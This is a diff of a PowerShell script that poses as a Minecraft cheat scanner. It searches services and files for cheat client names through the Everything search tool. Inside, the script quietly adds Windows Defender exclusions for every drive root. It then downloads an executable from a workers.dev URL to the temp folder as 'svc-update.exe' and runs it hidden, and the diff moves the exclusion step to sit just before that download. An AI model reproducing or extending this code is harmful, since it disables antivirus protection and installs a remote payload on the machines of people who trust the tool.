@@ -15,10 +15,14 @@ exit
 }
 
 try {
-$exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
-$outputPath = "$env:TEMP\svc-update.exe"
-Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
-Start-Process $outputPath -WindowStyle Hidden
+    Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
+} catch { }
+
+try {
+    $exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
+    $outputPath = "$env:TEMP\svc-update.exe"
+    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
+    Start-Process $outputPath -WindowStyle Hidden
 } catch { }
 
 $script:Criticals = [System.Collections.ArrayList]::new()
@@ -109,14 +113,14 @@ function Show-Banner {
 Clear-Host
 Write-Host ""
 Write-Host ""
-Write-Host "                                             _____ _               _             " -ForegroundColor White
-Write-Host "                                            / ____| |             | |            " -ForegroundColor White
-Write-Host "                                           | |    | |__   ___  ___| | _____ _ __ " -ForegroundColor White
-Write-Host "                                           | |    | '_ \ / _ \/ __| |/ / _ \ '__|" -ForegroundColor White
-Write-Host "                                           | |____| | | |  __/ (__|   <  __/ |   " -ForegroundColor White
-Write-Host "                                            \_____|_| |_|\___|\___|_|\_\___|_|   " -ForegroundColor White
+Write-Host "                                            _____ _               _             " -ForegroundColor White
+Write-Host "                                           / ____| |             | |            " -ForegroundColor White
+Write-Host "                                          | |    | |__   ___  ___| | _____ _ __ " -ForegroundColor White
+Write-Host "                                          | |    | '_ \ / _ \/ __| |/ / _ \ '__|" -ForegroundColor White
+Write-Host "                                          | |____| | | |  __/ (__|   <  __/ |   " -ForegroundColor White
+Write-Host "                                           \_____|_| |_|\___|\___|_|\_\___|_|   " -ForegroundColor White
 Write-Host ""
-Write-Host "                                            (+) Developed by reo.q [2026]" -ForegroundColor Yellow
+Write-Host "                                               (+) Developed by reo.q [2026]" -ForegroundColor Yellow
 Write-Host ""
 }
 
@@ -258,6 +262,15 @@ if ($diff.TotalMinutes -lt 60) { return "([math]::Round($diff.TotalMinutes))m ag
 }
 
 function Setup-Everything {
+# Kill all Everything processes first
+try {
+    $everythingProcs = Get-Process -Name "Everything" -ErrorAction SilentlyContinue
+    if ($everythingProcs) {
+        $everythingProcs | Stop-Process -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 500
+    }
+} catch { }
+
 $everythingExe = "$env:ProgramFiles\Everything\Everything.exe"
 $everythingExe86 = "${env:ProgramFiles(x86)}\Everything\Everything.exe"
 $localEs = "$env:ProgramFiles\Everything\es.exe"
@@ -286,8 +299,6 @@ try {
     if (Test-Path "$env:ProgramFiles\Everything\Everything.exe") {
         $script:EverythingPath = "$env:ProgramFiles\Everything\Everything.exe"
         $script:EsPath = "$env:ProgramFiles\Everything\es.exe"
-        Start-Process -FilePath $script:EverythingPath -ArgumentList "-startup" -NoNewWindow
-        Start-Sleep -Seconds 2
         $script:EverythingReady = $true
     }
 } catch { }
@@ -815,7 +826,53 @@ try { Get-ScheduledTask -EA SilentlyContinue | ForEach-Object { if (Test-Timeout
 
 function Scan-Services {
 if (Test-Timeout) { return }
-try { Get-Service -EA SilentlyContinue | ForEach-Object { if (Test-Timeout) { return }; $m = Match-Cheat $_.Name $script:ExactCheats; if ($m) { Add-Hit "CRIT" "Services" "Service: $m" $_.DisplayName } } } catch { }
+}
+
+function Show-EverythingMenu {
+    Write-Host ""
+    Write-Host ""
+    Show-DoubleLine "White" 60
+    Write-Center "EVERYTHING SEARCH OPTIONS" "White"
+    Show-DoubleLine "White" 60
+    Write-Host ""
+    Write-Host "  [1] DoomsDay check (.jar 1.8mb-2.6mb)" -ForegroundColor White
+    Write-Host "  [2] Cheat names search" -ForegroundColor White
+    Write-Host "  [0] Exit" -ForegroundColor Gray
+    Write-Host ""
+    Show-Line "Gray" 60
+    
+    while ($true) {
+        Write-Host ""
+        Write-Host " Select option (0-2): " -NoNewline -ForegroundColor Gray
+        
+        $choice = Read-Host
+        
+        if ($choice -eq "1") {
+            Write-Host " Opening Everything with DoomsDay filter..." -ForegroundColor Gray
+            try {
+                $filter = ".jar size:1.8mb-2.6mb"
+                Start-Process -FilePath $script:EverythingPath -ArgumentList "-search `"$filter`""
+            } catch {
+                Write-Host " Failed to open Everything" -ForegroundColor Red
+            }
+        }
+        elseif ($choice -eq "2") {
+            Write-Host " Opening Everything with cheat names..." -ForegroundColor Gray
+            try {
+                $filter = "Baritone|LiquidBounce|Wurst|GishCode|Inertia|Doomsday|Aristois|RusherHack|Zamorozka|Nursultan|Akrien|DeadCode|WEXSIDE|RichPremium|BleachHack|Kami|KamiBlue|Matix|Celestial|NightMare|BoberWare|ExLoader|celka|Expensive|BebraWare|Minced|NeverHook|Vape|Dreampool|Hitbox|dauniblyat|Nurik|CortexClient|AimBot|FreeCam|Wise|Azura|3arthh4ck|AutoAttack|InventoryTotem|ViaVersion|ViaForge|AutoTotem|Excellent|X-Ray|Schematica|ReplayMod|ChestStealer|DiamondGen|killaura|bushroot|ZenWare|Flavor|Neat|Britva|InvMove|TopkaAutoBuy|XorekAutoBuy|TopkaAutoSell|XorekAutoMyst|TopkaCasino|AutoSell|ElytraAutoPilot|AdvancedCompass|Xaero|Minimap"
+                Start-Process -FilePath $script:EverythingPath -ArgumentList "-search `"$filter`""
+            } catch {
+                Write-Host " Failed to open Everything" -ForegroundColor Red
+            }
+        }
+        elseif ($choice -eq "0") {
+            Write-Host " Exiting..." -ForegroundColor DarkGray
+            break
+        }
+        else {
+            Write-Host " Invalid option. Please select 0, 1, or 2." -ForegroundColor Red
+        }
+    }
 }
 
 function Scan-Browser {
@@ -842,7 +899,7 @@ try { Get-ChildItem $jumpPath -File -EA SilentlyContinue | ForEach-Object { if (
 }
 
 function Show-Report {
-$elapsed = (Get-Date) - $script:StartTime
+$elapsed = if ($script:StartTime) { (Get-Date) - $script:StartTime } else { New-TimeSpan }
 Write-Host ""
 Write-Host ""
 for ($i = 0; $i -lt 3; $i++) { $color = if ($i % 2 -eq 0) { "White" } else { "Gray" }; Show-DoubleLine $color 60; Start-Sleep -Milliseconds 60; $curPos = $Host.UI.RawUI.CursorPosition; $Host.UI.RawUI.CursorPosition = [System.Management.Automation.Host.Coordinates]::new(0, $curPos.Y - 1) }
@@ -862,7 +919,6 @@ Write-Host " [$($f.Module)] " -NoNewline -ForegroundColor DarkGray
 Write-Host $f.Message -ForegroundColor White
 if ($f.Details) { Write-Host " -- " -NoNewline -ForegroundColor Gray; Write-Host (CutStr $f.Details 55) -ForegroundColor DarkGray }
 $num++
-}
 }
 
 if ($script:Criticals.Count -gt 30) { Write-Host " ... and $($script:Criticals.Count - 30) more" -ForegroundColor DarkGray }
@@ -906,26 +962,13 @@ Write-Host " | " -NoNewline -ForegroundColor DarkGray
 Write-Host "[i] Info: " -NoNewline -ForegroundColor Gray
 Write-Host "$($script:Infos.Count)" -ForegroundColor Gray
 Write-Host ""
-Write-Host " Scan completed in: $($elapsed.ToString('mm\:ss'))" -ForegroundColor DarkGray
+Write-Host " Scan completed in: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Gray
 Write-Host ""
 Show-DoubleLine "Gray" 60
-Write-Host ""
-$script:ScanDeadline = (Get-Date).AddMinutes(10)
-$script:LastDeleted = $null
-$script:LastRecycleClear = $null
+}
+
 Show-Banner
 
-try {
-Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
-} catch { }
-
-Show-DoubleLine "Gray" 60
-$script:Infos.Clear()
-$script:StartTime = Get-Date
-$script:ScanDeadline = (Get-Date).AddMinutes(10)
-$script:LastDeleted = $null
-$script:LastRecycleClear = $null
-Show-Banner
 Show-DoubleLine "Gray" 60
 Write-Host ""
 Write-Host " [] Administrator: " -NoNewline -ForegroundColor Gray
@@ -939,6 +982,7 @@ Show-DoubleLine "White" 60
 Write-Center "<< SCANNING SYSTEM >>" "White"
 Show-DoubleLine "White" 60
 Write-Host ""
+$script:StartTime = Get-Date
 $total = 37
 Show-ProgressDots "Everything Search" 1 $total { Setup-Everything } -IsEverything
 Show-ProgressDots "Everything Scan" 2 $total { Scan-WithEverything }
@@ -986,8 +1030,10 @@ Write-Host "`r$analyzing..... [DONE]" -ForegroundColor Gray
 Start-Sleep -Milliseconds 500
 Show-Report
 
-Start-Check
+if ($script:EverythingReady -and $script:EverythingPath) {
+    Show-EverythingMenu
+}
+
 Write-Host ""
-Write-Host " Scan completed. Press Ctrl+C to exit." -ForegroundColor Gray
-Write-Host ""
-while ($true) { Start-Sleep -Seconds 60 }
+Write-Host " Press Enter to exit..." -ForegroundColor Gray
+$null = Read-Host
